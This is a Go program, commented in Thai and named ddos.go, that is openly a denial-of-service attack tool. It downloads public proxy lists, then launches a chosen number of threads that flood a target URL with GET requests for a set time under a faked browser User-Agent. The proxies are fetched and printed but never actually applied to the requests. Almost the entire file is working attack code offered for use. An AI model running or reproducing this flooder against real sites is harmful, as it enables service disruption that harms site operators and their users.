package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var wg sync.WaitGroup

// ฟังก์ชันที่ใช้ในการขอ Proxy จาก API
func getProxies() []string {
	var proxies []string
	urls := []string{
		"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
		"https://www.proxy-list.download/api/v1/get?type=http",
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
	}

	for _, url := range urls {
		resp, err := http.Get(url)
		if err != nil {
			fmt.Println("Error fetching proxies:", err)
			continue
		}
		defer resp.Body.Close()

		scanner := bufio.NewScanner(resp.Body)
		for scanner.Scan() {
			proxy := scanner.Text()
			proxies = append(proxies, proxy)
		}
	}

	return proxies
}

// ฟังก์ชันที่ใช้ในการโจมตี DDoS
func sendRequest(target string, proxy string, ua string) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	// เพิ่ม User-Agent header
	req.Header.Set("User-Agent", ua)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}

	fmt.Println(resp.StatusCode, proxy)
	resp.Body.Close()
}

// ฟังก์ชันที่ใช้ในการทำงานหลาย threads
func threadRun(target string, proxies []string, ua string, duration int) {
	defer wg.Done()
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		proxy := proxies[rand.Intn(len(proxies))]
		sendRequest(target, proxy, ua)
		time.Sleep(100 * time.Millisecond) // ปรับแต่งการหน่วงเวลา
	}
}

// ฟังก์ชันหลักในการจัดการ DDoS
func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: go run ddos.go <URL> <duration> <threads>")
		return
	}

	target := os.Args[1]
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid duration:", err)
		return
	}

	threads, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid threads:", err)
		return
	}

	// ดึง Proxy
	proxies := getProxies()
	if len(proxies) == 0 {
		fmt.Println("No proxies available")
		return
	}

	// สร้าง User-Agent ปลอม
	ua := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

	// เริ่มทำงาน threads
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go threadRun(target, proxies, ua, duration)
		fmt.Printf("Thread %d started\n", i+1)
	}

	// รอจนกว่า threads ทั้งหมดจะเสร็จสิ้น
	wg.Wait()
	fmt.Println("Attack completed")
}
